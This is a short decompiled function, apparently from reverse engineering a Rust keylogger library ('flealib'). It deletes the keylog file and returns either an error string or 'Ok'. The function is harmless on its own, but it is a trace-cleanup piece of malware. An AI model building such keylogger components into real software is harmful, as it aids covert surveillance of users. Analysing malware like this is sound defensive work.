__int64 __fastcall flealib::keylogger::remove_keylog_file(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  _QWORD v4[2]; // [rsp+8h] [rbp-10h] BYREF

  v2 = std::fs::remove_file(a2);
  if ( v2 )
  {
    v4[0] = v2;
    <T as alloc::string::SpecToString>::spec_to_string(a1, v4);
    core::ptr::drop_in_place<std::io::error::Error>(v4);
  }
  else
  {
    <T as alloc::slice::hack::ConvertVec>::to_vec(a1, aOk_1, 2LL);
  }
  return a1;
}